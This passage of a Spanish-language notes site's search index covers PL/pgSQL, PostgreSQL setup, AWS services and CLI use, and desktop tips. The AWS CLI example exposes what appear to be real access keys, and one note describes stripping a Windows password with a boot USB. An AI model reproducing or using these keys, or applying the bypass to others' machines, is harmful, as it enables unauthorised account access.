proceso cambia la cosa: returns tiene que ser setof return next en la variable de salida. FOR target IN query LOOP statements END LOOP ; create or replace function contador () returns setof int as $$ declare counter int ; begin for counter in 1 .. 5 loop return next counter ; end loop ; end ; $$ language plpgsql ; select contador (); contador --- 1 2 3 4 5 En el uso de querys en el for no tiene mucho misterio, es igual. Con el cambio que al declarar una variable como record y esta ser\u00e1 el argumento del bucle. create or replace function contador () returns setof int as $$ declare counter record ; begin for counter in select oficina from oficinas loop return next counter . oficina ; end loop ; end ; $$ language plpgsql ;","title":"For"},{"location":"bases_datos/postgres/plpgsql/#foreach","text":"El bucle FOREACH es muy parecido a un bucle FOR, pero en lugar de iterar a trav\u00e9s de las filas devueltas por una consulta SQL, itera a trav\u00e9s de los elementos de un valor de matriz. (En general, FOREACH est\u00e1 dise\u00f1ado para recorrer componentes de una expresi\u00f3n de valor compuesto; en el futuro se pueden agregar variantes para recorrer compuestos adem\u00e1s de matrices). La instrucci\u00f3n FOREACH para recorrer una matriz es: create or replace function resto_letra ( resto int ) returns varchar as $$ declare res varchar : = '' ; contador int : = 0 ; letra varchar ; a varchar [] : = array [ 'T' , 'R' , 'W' , 'A' , 'G' , 'M' , 'Y' , 'F' , 'P' , 'D' , 'X' , 'B' , 'N' , 'J' , 'Z' , 'S' , 'Q' , 'V' , 'H' , 'L' , 'C' , 'K' , 'E' ]; begin foreach letra in array a loop if contador = resto then res : = letra ; end if ; contador : = contador + 1 ; end loop ; return res ; end ; $$ language plpgsql ;","title":"Foreach"},{"location":"bases_datos/postgres/plpgsql/#while","text":"While es un bucle con condici\u00f3n de salida. create or replace function contador () returns setof int as $$ declare counter int : = 0 ; begin while counter <= 6 loop return next counter ; counter : = counter + 1 ; end loop ; end ; $$ language plpgsql ;","title":"While"},{"location":"bases_datos/postgres/plpgsql/#exceptions","text":"error codes create or replace FUNCTION in_pacient ( nom , cognom , dni ) returns text AS $$ BEGIN INSERT INTO pacients VALUES ( default , nom , cognoms , dni ); return 'datos introducidos correctamente' ; EXCEPTION WHEN unique_violation THEN return 'Clau unica duplicada' ; WHEN foreign_key_violation THEN return 'Clau foranea inexistent' ; END ; $$ LANGUAGE plpgsql ;","title":"Exceptions"},{"location":"bases_datos/postgres/plpgsql/#perform","text":"Una instrucci\u00f3n PERFORM establece FOUND verdadero si produce una o m\u00e1s filas, falso si no se produce ninguna fila. Ademas descarta el resultado ( es decir no lo muestra por pantalla ). ... perform dni from pacients where dni = fila . dni ; if found then ... ...","title":"Perform"},{"location":"bases_datos/postgres/plpgsql/#retornar-selects","text":"Al tratar con selects en funciones hay que tener en cuenta, que tienes que especificar en return que devuelves una query, con: return query","title":"Retornar selects"},{"location":"bases_datos/postgres/plpgsql/#return-una-columna","text":"Cuando devolvemos una columna de una query, hay que tener en cuenta de a\u00f1adir en returns el tipo setof que construye un conjunto con el resultado y lo muestra. create or replace FUNCTION maxdos_promig_anual ( anio int ) returns setof numeric as $$ begin return query select max ( promig_anual ( num_empl , anio )) from repventas ; end ; $$ language plpgsql ; select max_promig_anual ( 1990 ); max_promig_anual --- 11566 ( 1 fila )","title":"Return una columna"},{"location":"bases_datos/postgres/plpgsql/#return-varias-columnas","text":"Si tenemos que devolver varias columnas de una tabla, primero tenemos que crear una tabla en returns. Especificar el tipo de campo en cada columna y estos han de coincidir en la query. CREATE OR REPLACE FUNCTION clientes_rep ( rep int ) RETURNS table ( cliente smallint , credito numeric ) as $$ begin return query select num_clie , limite_credito from clientes where rep_clie = rep ; end ; $$ LANGUAGE plpgsql ; select * from clientes_rep ( 103 ); cliente | credito ---------+---------- 2111 | 50000 . 00 2121 | 45000 . 00 2109 | 25000 . 00 ( 3 filas )","title":"Return varias columnas"},{"location":"bases_datos/postgres/plpgsql/#exportar-typo-columna","text":"En ocasiones no sabemos que typo de columna tenemos que devolver, una forma f\u00e1cil es se\u00f1alar la tabla columna e indicarle que lo exporte directamente. ... returns table ( nom_empresa clientes . empresa % type , id_clie clientes . num_clie % type , nom_rep repventas . nombre % type ) ...","title":"Exportar typo columna"},{"location":"bases_datos/postgres/plpgsql/#borrar-todas-funciones-user","text":"select 'DROP FUNCTION ' || ns . nspname || '.' || proname || '(' || oidvectortypes ( proargtypes ) || ');' FROM pg_proc INNER JOIN pg_namespace ns ON ( pg_proc . pronamespace = ns . oid ) where ns . nspname = 'public' ;","title":"Borrar todas funciones user"},{"location":"bases_datos/postgres/plpgsql/#variables-especiales-en-plpgsql","text":"Cuando una funci\u00f3n escrita en PL/pgSQL es llamada por un disparador tenemos ciertas variableS especiales disponibles en dicha funci\u00f3n. Estas variables son las siguientes: NEW Tipo de dato RECORD; Variable que contiene la nueva fila de la tabla para las operaciones INSERT/UPDATE en disparadores del tipo row-level. Esta variable es NULL en disparadores del tipo statement-level. OLD Tipo de dato RECORD; Variable que contiene la antigua fila de la tabla para las operaciones UPDATE/DELETE en disparadores del tipo row-level. Esta variable es NULL en disparadores del tipo statement-level. TG_NAME Tipo de dato name; variable que contiene el nombre del disparador que est\u00e1 usando la funci\u00f3n actualmente. TG_WHEN Tipo de dato text; una cadena de texto con el valor BEFORE o AFTER dependiendo de como el disparador que est\u00e1 usando la funci\u00f3n actualmente ha sido definido TG_LEVEL Tipo de dato text; una cadena de texto con el valor ROW o STATEMENT dependiendo de como el disparador que est\u00e1 usando la funci\u00f3n actualmente ha sido definido TG_OP Tipo de dato text; una cadena de texto con el valor INSERT, UPDATE o DELETE dependiendo de la operaci\u00f3n que ha activado el disparador que est\u00e1 usando la funci\u00f3n actualmente. TG_RELID Tipo de dato oid; el identificador de objeto de la tabla que ha activado el disparador que est\u00e1 usando la funci\u00f3n actualmente. TG_RELNAME Tipo de dato name; el nombre de la tabla que ha activado el disparador que est\u00e1 usando la funci\u00f3n actualmente. Esta variable es obsoleta y puede desaparacer en el futuro. Usar TG_TABLE_NAME. TG_TABLE_NAME Tipo de dato name; el nombre de la tabla que ha activado el disparador que est\u00e1 usando la funci\u00f3n actualmente. TG_TABLE_SCHEMA Tipo de dato name; el nombre de la schema de la tabla que ha activado el disparador que est\u00e1 usando la funci\u00f3n actualmente. TG_NARGS Tipo de dato integer; el n\u00famero de argumentos dados al procedimiento en la sentencia CREATE TRIGGER. TG_ARGV[] Tipo de dato text array; los argumentos de la sentencia CREATE TRIGGER. El \u00edndice empieza a contar desde 0. Indices inv\u00e1lidos (menores que 0 \u00f3 mayores/iguales que tg_nargs) resultan en valores nulos.","title":"Variables especiales en PL/pgSQL"},{"location":"bases_datos/postgres/plpgsql/#trigger","text":"Triger es una acci\u00f3n automatizada que se ejecuta antes o despues de hacer un insert, update o delete. Consiste en una funcion que se encarga de hacer la acci\u00f3n, y un disparador que se encarga de determinar en que momento ejecutarse. Caracteristicas de la funci\u00f3n: Tiene que crearse la funcion antes que elm disparador No tiene que tener argumentos y deve devolver siempre trigger El procedimiento STASTEMENT siempre tiene que devolver NULL Si una tabla tiene mas de un disparador definido, estos se ejecutaran por orden alfabetico. La fila retornada por cada disparador , se convierte en la entrada del siguiente. Se tiene que tener cuidado con no hacer bucles infinitos llamando a un disparador recursivamente. Una funcion de trigger FOR EACH ROW : S'executa per cada registre afectat per la sent\u00e8ncia SQL. Els exemples anteriors s\u00f3n row-level. FOR EACH STATEMENT : S'executa nom\u00e9s un cop, tant si la sent\u00e8cia SQL afecta nom\u00e9s a un registre com si n'afecta a m\u00e9s d'un. En els exemples anteriors el TRIGGER BEFORE DELETE afecta a varis registres, si hagu\u00e9s sigut statement-level nom\u00e9s s'hagu\u00e9s executat un cop la funci\u00f3. -- funcion create or replace function anadir_log() returns TRIGGER AS $$ BEGIN insert into registro_log values (current_user, TG_TABLE_NAME, TG_OP, current_timestamp); RETURN NULL; END; $$ language plpgsql; -- disparador create trigger anadir_log after insert or update or delete on resultats for each statement execute procedure anadir_log(); select array_position(array['p','o'],'p'); array_position 1","title":"Trigger"},{"location":"bases_datos/postgres/postgresql-intalacion/","text":"instalar sudo dnf install -y postgresql-server Crear espacio de datos necesario del SGBDR sudo postgresql-setup initdb Modificar permiso de acceso remoto vim /var/lib/pgsql/data/pg_hba.conf # \"local\" is for Unix domain socket connections only local all all peer # IPv4 local connections: host all all 127 .0.0.1/32 md5 # IPv6 local connections: host all all ::1/128 md5 # Allow replication connections from localhost, by a user with the # replication privilege. local replication all peer host replication all 127 .0.0.1/32 md5 host replication all ::1/128 md5 Iniciar servicio sudo systemctl start postgresql A\u00f1adir contrase\u00f1a de acceso a postgres sudo passwd postgres su postgres psql template1 -U postgres alter user postgres with encrypted password 'postgres' psql -d template1 -U postgres -h localhost","title":"Postgresql intalacion"},{"location":"cloud/aws/","text":"aws Funcionalidades generales de aws, este documento a sedo creado para repasar rapidamente que son las funcionalidades m\u00e1s comunes de aws. S3 S3 es el almacenamiento de ficheros que tiene amazon, se gestiona mediante buckets ( directorios ) , puede utilizarse simplemente para alojar ficheros o como directorio web. Ofrece: control de versiones replicacion de datos seguridad y encriptaci\u00f3n transfer acelerate alojamiento de sitios web CloudFront CloudFront replica el contenido de un bucket en todos los servidores generales de amazon, esto aporta una mayor rapidez en las peticiones web, ser\u00e1n autom\u00e1ticamente enrutadas a la localizaci\u00f3n del servidor de aws mas cercano a tu localizaci\u00f3n. As\u00ed est\u00e9s en la parte del mundo que est\u00e9s tendr\u00e1s una petici\u00f3n r\u00e1pida con la web. Se utiliza para distribuciones web (alojamiento web) o RTMP (streaming de v\u00eddeo) Storage gateway TODO Snowball Es una soluci\u00f3n de transporte de datos a nivel de petabytes, para transportar datos de forma f\u00edsica, desde aws o hasta aws. Es decir transportar multitud de datos en una maleta desde tu dispositivo local a aws o a la inversa. Se utiliza para migrar datos anal\u00edticos, biblioteca de v\u00eddeos, remplazo de cintas, backups, etc. Se solicita un dispositivo snowball desde la consola aws una vez recibido se conecta a la red local y se graban los datos se env\u00eda el dispositivo snowball a aws e introducen la informaci\u00f3n en los buckes de la empresa. CLI https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html # configurar acceso consola \u279c ~ aws configure AWS Access Key ID [ ****************TW4T ] : AKIARTYVO34XH4YS25VN AWS Secret Access Key [ ****************DeJP ] : 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 Default region name [ eu-west-2 ] : Default output format [ json ] : # listado de buckets \u279c ~ aws s3 ls 2021 -01-20 11 :00:26 bucket.mybuck.imagenes \u279c ~ aws s3 ls s3://bucket.mybuck.imagenes 2021 -01-18 12 :30:34 85870 Pirineus_Barcelona_h1.jpg 2021 -01-20 10 :42:04 33 tesversion.txt # copido de archivos \u279c ~ aws s3 cp Documentos/Vagrant.md s3://bucket.mybuck.imagenes/ upload: Documentos/Vagrant.md to s3://bucket.mybuck.imagenes/Vagrant.md \u279c ~ aws s3 cp s3://bucket.mybuck.imagenes s3://bucket.mybuck.files --recursive copy: s3://bucket.mybuck.imagenes/tesversion.txt to s3://bucket.mybuck.files/tesversion.txt copy: s3://bucket.mybuck.imagenes/Vagrant.md to s3://bucket.mybuck.files/Vagrant.md copy: s3://bucket.mybuck.imagenes/Pirineus_Barcelona_h1.jpg to s3://bucket.mybuck.files/Pirineus_Barcelona_h1.jpg \u279c ~ aws s3 cp s3://bucket.mybuck.imagenes/Vagrant.md s3://bucket.mybuck.files/ copy: s3://bucket.mybuck.imagenes/Vagrant.md to s3://bucket.mybuck.files/Vagrant.md # borrado de archivos en bucket \u279c ~ aws s3 ls s3://bucket.mybuck.files 2021 -01-20 11 :28:21 85870 Pirineus_Barcelona_h1.jpg 2021 -01-20 11 :28:21 8182 Vagrant.md 2021 -01-20 11 :28:21 33 tesversion.txt \u279c ~ aws s3 rm s3://bucket.mybuck.files/Pirineus_Barcelona_h1.jpg delete: s3://bucket.mybuck.files/Pirineus_Barcelona_h1.jpg # borrado de bucket \u279c ~ aws s3 rb s3://bucket.mybuck.files --force delete: s3://bucket.mybuck.files/Vagrant.md delete: s3://bucket.mybuck.files/tesversion.txt remove_bucket: bucket.mybuck.files Ec2 EC2 proporciona m\u00e1quinas virtuales en la nube. balaceadores de carga aplicaciones es el mas adecuado para balancear trafico http, https red es el mas adecuado para el control del protocolo de transmisi\u00f3n TCP y de la seguridad TLS para la que se requiere un rendimiento extremo. cl\u00e1sico equilibrio de carga b\u00e1sico en varias instancias ec2, funciona tanto en nivel de solicitud como de conexi\u00f3n. roles permisos entre servicios dentro de aws. Por ejemplo si una instancia de EC2 quiere acceder a un bucket esta instancia debe tener un rol con permisos al menos de read en S3 metadata Metadatos son datos que se asignan por defecto a una instancia, y la manera de visualizarlos es la siguiente. [ ec2-user@ip-172-31-43-213 ~ ] $ curl http://169.254.169.254/latest/meta-data/ ami-id ami-launch-index ami-manifest-path block-device-mapping/ events/ hibernation/ hostname iam/ identity-credentials/ instance-action instance-id instance-life-cycle instance-type local-hostname local-ipv4 mac metrics/ network/ placement/ profile public-hostname public-ipv4 public-keys/ reservation-id security-groups services/ [ ec2-user@ip-172-31-43-213 ~ ] $ curl http://169.254.169.254/latest/meta-data/public-ipv4 35 .178.148.97 [ ec2-user@ip-172-31-43-213 ~ ] $ curl http://169.254.169.254/latest/user-data #!/bin/bash yum update -y yum install httpd -y aws s3 cp s3://bucket-mybuck-web/index.html /var/www/html/ Auto escalado El auto escalado permite mediante grupos de configuraci\u00f3n desplegar varias instancias a la vez con la misma configuraci\u00f3n y seg\u00fan el rendimiento que est\u00e9n teniendo auto escalarse aumentando o disminuyendo el numero de instancias. Se utiliza junto a un balanceador de carga para redireccionar las peticiones autom\u00e1ticamente. En el caso que se caiga una instancia por el motivo que sea, se elimina y se crea una nueva autom\u00e1ticamente. CloudWatch Es un servicio de monitorizaci\u00f3n de los diferentes servicios de aws, puedes crear paneles, alertas, o acciones seg\u00fan el estado de las instancias etc.. EFS Elastic file system es un almacenamiento autoescalable que proporciona aws, este almacenamiento se monta en las instancias EC2, es necesario instalar amazon-efs-utils y el montaje es similar al siguiente sudo mount -t efs -o tls,accesspoint=fsap-08feb0179b349a252 fs-b7c0f446:/ /var/www/html se paga por la capacidad de datos que utilizas. tiene bajas latencias para cargas de trabajo esta dise\u00f1ado para el acceso compartido de miles de instancias EC2 es un servicio completamente administrativo no es necesario aprovisionar ninguna capacidad de almacenamiento por adelantado acceso de forma segura permite cifrado en transito y almacenamiento permite controlar el acceso mediante IAM Route53 Enrutamiento simple : enrutamiento por una o mas ip y el mismo dns se encarga del balanceo Enrutamiento ponderado : este es un enrutamiento que indicas el porcentaje de carga que tendr\u00e1 cada servidor, por ejemplo teniendo dos servidores uno que coja el 80% y el segundo un 20% Enrutamiento por latencia : teniendo diferentes servidores, responder\u00e1 el que tenga menos latencia. Enrutamiento de conmutaci\u00f3n por error : en este caso se crea una comprobaci\u00f3n de estado en route53 este comprueba que el servidor este en correcto estado, en el caso contrario redirigir\u00e1 las peticiones a un servidor secundario. Enrutamiento por geolocalizaci\u00f3n : se asocian servidores a una zona geogr\u00e1fica como, EU, USA, Asia, etc... Enrutamiento por respuesta multivalor : teniendo m\u00faltiples servidores se le asignan comprobaci\u00f3n de estado a todos y en el caso de caer uno, se redirige a los dem\u00e1s y ese deja de recibir peticiones. Bases de datos El beneficio de usar este servicio es tener backups automatizados, y el auto-escalado, ademas ofrece replicar r\u00e1pidamente una base de datos en read only. AWS ofrece diferentes tipos de bases de datos relacionales, no relacionales y en memoria, y formato ofrece diferentes bases de datos, relacionales aurora : base de datos compatible con mysql y postgres creada para la nube y combina el rendimiento y la disponibilidad de las bases de datos tradicionales. rds : relational database service, es un servicio de bases de datos que ofrece aws, aurora, mysql, mariadb, postgres, oracle sqlserver. redshift : servicio de almacenamiento de datos \u00e1gil y escalable, permite analizar los datos de manera simple y rentable. Ofrece un rendimiento diez veces superior gracias a aprendizaje autom\u00e1tico y disco de alto rendimiento. No relacionales DynamoDB . es un servicio de base de datos noSql r\u00e1pido y flexible para cualquier escala. En memoria Son bases de datos que se ejecutan en memoria, son extremadamente r\u00e1pidas, pero no permiten datos perdurables. ElastiCache para Redis ElastiCache para Memcached VPC VPC gestiona todo el servicio de red en AWS gesti\u00f3n de gateway redes y subredes ( p\u00fablicas y privadas ) enrutamiento SQS Servicio de colas de aws, creaci\u00f3n de colas para aplicaciones. Este servicio es \u00fatil por ejemplo en una aplicaci\u00f3n que recibe instrucciones de hacer alguna cosa, por ejemplo una impresora. Una aplicaci\u00f3n se encargar\u00eda de enviar el mensaje a la cola y la segunda aplicaci\u00f3n de recoger cada mensaje y ejecutar la tarea especifica. En el caso de que caiga la segunda aplicaci\u00f3n no se perder\u00e1 ninguna tarea, porque los mensajes seguir\u00e1n en la cola esperando ser recogidos. Elastic Transcoder Elastic ranscoder permite cambiar formatos de archivos autom\u00e1ticamente de un bucket S3 a otro bucket S3. Por ejemplo cambiar la resoluci\u00f3n de un archivo de v\u00eddeo, as\u00ed estar optimizado para visualizaciones en pantallas de diferentes tama\u00f1os.","title":"aws"},{"location":"cloud/aws/#aws","text":"Funcionalidades generales de aws, este documento a sedo creado para repasar rapidamente que son las funcionalidades m\u00e1s comunes de aws.","title":"aws"},{"location":"cloud/aws/#s3","text":"S3 es el almacenamiento de ficheros que tiene amazon, se gestiona mediante buckets ( directorios ) , puede utilizarse simplemente para alojar ficheros o como directorio web. Ofrece: control de versiones replicacion de datos seguridad y encriptaci\u00f3n transfer acelerate alojamiento de sitios web","title":"S3"},{"location":"cloud/aws/#cloudfront","text":"CloudFront replica el contenido de un bucket en todos los servidores generales de amazon, esto aporta una mayor rapidez en las peticiones web, ser\u00e1n autom\u00e1ticamente enrutadas a la localizaci\u00f3n del servidor de aws mas cercano a tu localizaci\u00f3n. As\u00ed est\u00e9s en la parte del mundo que est\u00e9s tendr\u00e1s una petici\u00f3n r\u00e1pida con la web. Se utiliza para distribuciones web (alojamiento web) o RTMP (streaming de v\u00eddeo)","title":"CloudFront"},{"location":"cloud/aws/#storage-gateway","text":"TODO","title":"Storage gateway"},{"location":"cloud/aws/#snowball","text":"Es una soluci\u00f3n de transporte de datos a nivel de petabytes, para transportar datos de forma f\u00edsica, desde aws o hasta aws. Es decir transportar multitud de datos en una maleta desde tu dispositivo local a aws o a la inversa. Se utiliza para migrar datos anal\u00edticos, biblioteca de v\u00eddeos, remplazo de cintas, backups, etc. Se solicita un dispositivo snowball desde la consola aws una vez recibido se conecta a la red local y se graban los datos se env\u00eda el dispositivo snowball a aws e introducen la informaci\u00f3n en los buckes de la empresa.","title":"Snowball"},{"location":"cloud/aws/#cli","text":"https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html # configurar acceso consola \u279c ~ aws configure AWS Access Key ID [ ****************TW4T ] : AKIARTYVO34XH4YS25VN AWS Secret Access Key [ ****************DeJP ] : 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 Default region name [ eu-west-2 ] : Default output format [ json ] : # listado de buckets \u279c ~ aws s3 ls 2021 -01-20 11 :00:26 bucket.mybuck.imagenes \u279c ~ aws s3 ls s3://bucket.mybuck.imagenes 2021 -01-18 12 :30:34 85870 Pirineus_Barcelona_h1.jpg 2021 -01-20 10 :42:04 33 tesversion.txt # copido de archivos \u279c ~ aws s3 cp Documentos/Vagrant.md s3://bucket.mybuck.imagenes/ upload: Documentos/Vagrant.md to s3://bucket.mybuck.imagenes/Vagrant.md \u279c ~ aws s3 cp s3://bucket.mybuck.imagenes s3://bucket.mybuck.files --recursive copy: s3://bucket.mybuck.imagenes/tesversion.txt to s3://bucket.mybuck.files/tesversion.txt copy: s3://bucket.mybuck.imagenes/Vagrant.md to s3://bucket.mybuck.files/Vagrant.md copy: s3://bucket.mybuck.imagenes/Pirineus_Barcelona_h1.jpg to s3://bucket.mybuck.files/Pirineus_Barcelona_h1.jpg \u279c ~ aws s3 cp s3://bucket.mybuck.imagenes/Vagrant.md s3://bucket.mybuck.files/ copy: s3://bucket.mybuck.imagenes/Vagrant.md to s3://bucket.mybuck.files/Vagrant.md # borrado de archivos en bucket \u279c ~ aws s3 ls s3://bucket.mybuck.files 2021 -01-20 11 :28:21 85870 Pirineus_Barcelona_h1.jpg 2021 -01-20 11 :28:21 8182 Vagrant.md 2021 -01-20 11 :28:21 33 tesversion.txt \u279c ~ aws s3 rm s3://bucket.mybuck.files/Pirineus_Barcelona_h1.jpg delete: s3://bucket.mybuck.files/Pirineus_Barcelona_h1.jpg # borrado de bucket \u279c ~ aws s3 rb s3://bucket.mybuck.files --force delete: s3://bucket.mybuck.files/Vagrant.md delete: s3://bucket.mybuck.files/tesversion.txt remove_bucket: bucket.mybuck.files","title":"CLI"},{"location":"cloud/aws/#ec2","text":"EC2 proporciona m\u00e1quinas virtuales en la nube.","title":"Ec2"},{"location":"cloud/aws/#balaceadores-de-carga","text":"aplicaciones es el mas adecuado para balancear trafico http, https red es el mas adecuado para el control del protocolo de transmisi\u00f3n TCP y de la seguridad TLS para la que se requiere un rendimiento extremo. cl\u00e1sico equilibrio de carga b\u00e1sico en varias instancias ec2, funciona tanto en nivel de solicitud como de conexi\u00f3n.","title":"balaceadores de carga"},{"location":"cloud/aws/#roles","text":"permisos entre servicios dentro de aws. Por ejemplo si una instancia de EC2 quiere acceder a un bucket esta instancia debe tener un rol con permisos al menos de read en S3","title":"roles"},{"location":"cloud/aws/#metadata","text":"Metadatos son datos que se asignan por defecto a una instancia, y la manera de visualizarlos es la siguiente. [ ec2-user@ip-172-31-43-213 ~ ] $ curl http://169.254.169.254/latest/meta-data/ ami-id ami-launch-index ami-manifest-path block-device-mapping/ events/ hibernation/ hostname iam/ identity-credentials/ instance-action instance-id instance-life-cycle instance-type local-hostname local-ipv4 mac metrics/ network/ placement/ profile public-hostname public-ipv4 public-keys/ reservation-id security-groups services/ [ ec2-user@ip-172-31-43-213 ~ ] $ curl http://169.254.169.254/latest/meta-data/public-ipv4 35 .178.148.97 [ ec2-user@ip-172-31-43-213 ~ ] $ curl http://169.254.169.254/latest/user-data #!/bin/bash yum update -y yum install httpd -y aws s3 cp s3://bucket-mybuck-web/index.html /var/www/html/","title":"metadata"},{"location":"cloud/aws/#auto-escalado","text":"El auto escalado permite mediante grupos de configuraci\u00f3n desplegar varias instancias a la vez con la misma configuraci\u00f3n y seg\u00fan el rendimiento que est\u00e9n teniendo auto escalarse aumentando o disminuyendo el numero de instancias. Se utiliza junto a un balanceador de carga para redireccionar las peticiones autom\u00e1ticamente. En el caso que se caiga una instancia por el motivo que sea, se elimina y se crea una nueva autom\u00e1ticamente.","title":"Auto escalado"},{"location":"cloud/aws/#cloudwatch","text":"Es un servicio de monitorizaci\u00f3n de los diferentes servicios de aws, puedes crear paneles, alertas, o acciones seg\u00fan el estado de las instancias etc..","title":"CloudWatch"},{"location":"cloud/aws/#efs","text":"Elastic file system es un almacenamiento autoescalable que proporciona aws, este almacenamiento se monta en las instancias EC2, es necesario instalar amazon-efs-utils y el montaje es similar al siguiente sudo mount -t efs -o tls,accesspoint=fsap-08feb0179b349a252 fs-b7c0f446:/ /var/www/html se paga por la capacidad de datos que utilizas. tiene bajas latencias para cargas de trabajo esta dise\u00f1ado para el acceso compartido de miles de instancias EC2 es un servicio completamente administrativo no es necesario aprovisionar ninguna capacidad de almacenamiento por adelantado acceso de forma segura permite cifrado en transito y almacenamiento permite controlar el acceso mediante IAM","title":"EFS"},{"location":"cloud/aws/#route53","text":"Enrutamiento simple : enrutamiento por una o mas ip y el mismo dns se encarga del balanceo Enrutamiento ponderado : este es un enrutamiento que indicas el porcentaje de carga que tendr\u00e1 cada servidor, por ejemplo teniendo dos servidores uno que coja el 80% y el segundo un 20% Enrutamiento por latencia : teniendo diferentes servidores, responder\u00e1 el que tenga menos latencia. Enrutamiento de conmutaci\u00f3n por error : en este caso se crea una comprobaci\u00f3n de estado en route53 este comprueba que el servidor este en correcto estado, en el caso contrario redirigir\u00e1 las peticiones a un servidor secundario. Enrutamiento por geolocalizaci\u00f3n : se asocian servidores a una zona geogr\u00e1fica como, EU, USA, Asia, etc... Enrutamiento por respuesta multivalor : teniendo m\u00faltiples servidores se le asignan comprobaci\u00f3n de estado a todos y en el caso de caer uno, se redirige a los dem\u00e1s y ese deja de recibir peticiones.","title":"Route53"},{"location":"cloud/aws/#bases-de-datos","text":"El beneficio de usar este servicio es tener backups automatizados, y el auto-escalado, ademas ofrece replicar r\u00e1pidamente una base de datos en read only. AWS ofrece diferentes tipos de bases de datos relacionales, no relacionales y en memoria, y formato ofrece diferentes bases de datos,","title":"Bases de datos"},{"location":"cloud/aws/#relacionales","text":"aurora : base de datos compatible con mysql y postgres creada para la nube y combina el rendimiento y la disponibilidad de las bases de datos tradicionales. rds : relational database service, es un servicio de bases de datos que ofrece aws, aurora, mysql, mariadb, postgres, oracle sqlserver. redshift : servicio de almacenamiento de datos \u00e1gil y escalable, permite analizar los datos de manera simple y rentable. Ofrece un rendimiento diez veces superior gracias a aprendizaje autom\u00e1tico y disco de alto rendimiento.","title":"relacionales"},{"location":"cloud/aws/#no-relacionales","text":"DynamoDB . es un servicio de base de datos noSql r\u00e1pido y flexible para cualquier escala.","title":"No relacionales"},{"location":"cloud/aws/#en-memoria","text":"Son bases de datos que se ejecutan en memoria, son extremadamente r\u00e1pidas, pero no permiten datos perdurables. ElastiCache para Redis ElastiCache para Memcached","title":"En memoria"},{"location":"cloud/aws/#vpc","text":"VPC gestiona todo el servicio de red en AWS gesti\u00f3n de gateway redes y subredes ( p\u00fablicas y privadas ) enrutamiento","title":"VPC"},{"location":"cloud/aws/#sqs","text":"Servicio de colas de aws, creaci\u00f3n de colas para aplicaciones. Este servicio es \u00fatil por ejemplo en una aplicaci\u00f3n que recibe instrucciones de hacer alguna cosa, por ejemplo una impresora. Una aplicaci\u00f3n se encargar\u00eda de enviar el mensaje a la cola y la segunda aplicaci\u00f3n de recoger cada mensaje y ejecutar la tarea especifica. En el caso de que caiga la segunda aplicaci\u00f3n no se perder\u00e1 ninguna tarea, porque los mensajes seguir\u00e1n en la cola esperando ser recogidos.","title":"SQS"},{"location":"cloud/aws/#elastic-transcoder","text":"Elastic ranscoder permite cambiar formatos de archivos autom\u00e1ticamente de un bucket S3 a otro bucket S3. Por ejemplo cambiar la resoluci\u00f3n de un archivo de v\u00eddeo, as\u00ed estar optimizado para visualizaciones en pantallas de diferentes tama\u00f1os.","title":"Elastic Transcoder"},{"location":"curiosidades/Eliminar_contrase%C3%B1a_windows/","text":"Eliminar contrase\u00f1a windows Descargar hiren\u2019s y lo insertamos en un usb. arrancas el pc con hiren\u2019s y escoges la opci\u00f3n change password winxp/7/nt Eliges la partici\u00f3n donde se encuentra windows enter espacio opci\u00f3n resetear contrase\u00f1a ( reset password ) edit user data and password eliges usuario a cambiar o quitar la contrase\u00f1a opci\u00f3n quitar contrase\u00f1a salir ! salir q abourt to write files ( guardar los cambios ) y","title":"Eliminar contrase\u00f1a windows"},{"location":"curiosidades/Eliminar_contrase%C3%B1a_windows/#eliminar-contrasena-windows","text":"Descargar hiren\u2019s y lo insertamos en un usb. arrancas el pc con hiren\u2019s y escoges la opci\u00f3n change password winxp/7/nt Eliges la partici\u00f3n donde se encuentra windows enter espacio opci\u00f3n resetear contrase\u00f1a ( reset password ) edit user data and password eliges usuario a cambiar o quitar la contrase\u00f1a opci\u00f3n quitar contrase\u00f1a salir ! salir q abourt to write files ( guardar los cambios ) y","title":"Eliminar contrase\u00f1a windows"},{"location":"curiosidades/Lanzador_aplicaciones_en_gnome/","text":"Lanzador aplicaciones en gnome A veces instalamos una aplicaci\u00f3n y no nos inserta un enlace en el lanzador de gnome, pues esta es una solucion sencilla al problema. Lo que hace es crear un archivo *.descktop en /usr/share/applications y as\u00ed poder visualizar la aplicaci\u00f3n en el escritorio. sudo gnome-desktop-item-edit /usr/share/applications --create-new le indicamos que es una aplicacion imagen a mostrar nombre comando que queremos que ejecute /opt/firefox/firefox # por poner alguna aleatoria Esta ejecutando el binario de firefox en este caso. y opcional un comentario. Y tienes el icono de escritorio.","title":"Lanzador aplicaciones en gnome"},{"location":"curiosidades/Lanzador_aplicaciones_en_gnome/#lanzador-aplicaciones-en-gnome","text":"A veces instalamos una aplicaci\u00f3n y no nos inserta un enlace en el lanzador de gnome, pues esta es una solucion sencilla al problema. Lo que hace es crear un archivo *.descktop en /usr/share/applications y as\u00ed poder visualizar la aplicaci\u00f3n en el escritorio. sudo gnome-desktop-item-edit /usr/share/applications --create-new le indicamos que es una aplicacion imagen a mostrar nombre comando que queremos que ejecute /opt/firefox/firefox # por poner alguna aleatoria Esta ejecutando el binario de firefox en este caso. y opcional un comentario. Y tienes el icono de escritorio.","title":"Lanzador aplicaciones en gnome"},{"location":"curiosidades/cambiar_color_promp_terminal/","text":"Cambiar color promp terminal Insertar las 2 l\u00edneas siguientes al final del archivo .bashrc de tu carpeta personal, escoger el n\u00famero de color que nos gusta y modificar el n\u00famero en negrita, en mi caso he escogido el 36 cain. modificar archivo .bashrc en carpeta personal # User specific aliases and functions PS1 = '\\[\\e[;36m\\][\\u@\\h \\W]\\$\\[\\e[0m\\]' export PS1 [;30]hola color[0m] -- negro [;34]hola color[0m] -- azul [;32]hola color[0m] -- verde [;36]hola color[0m] -- chain [;31]hola color[0m] -- rojo [;35]hola color[0m] -- lila [;37]hola color[0m] \u2192 blanco","title":"Cambiar color promp terminal"},{"location":"curiosidades/cambiar_color_promp_terminal/#cambiar-color-promp-terminal","text":"Insertar las 2 l\u00edneas siguientes al final del archivo .bashrc de tu carpeta personal, escoger el n\u00famero de color que nos gusta y modificar el n\u00famero en negrita, en mi caso he escogido el 36 cain. modificar archivo .bashrc en carpeta personal # User specific aliases and functions PS1 = '\\[\\e[;36m\\][\\u@\\h \\W]\\$\\[\\e[0m\\]' export PS1 [;30]hola color[0m] -- negro [;34]hola color[0m] -- azul [;32]hola color[0m] -- verde [;36]hola color[0m] -- chain [;31]hola color[0m] -- rojo [;35]hola color[0m] -- 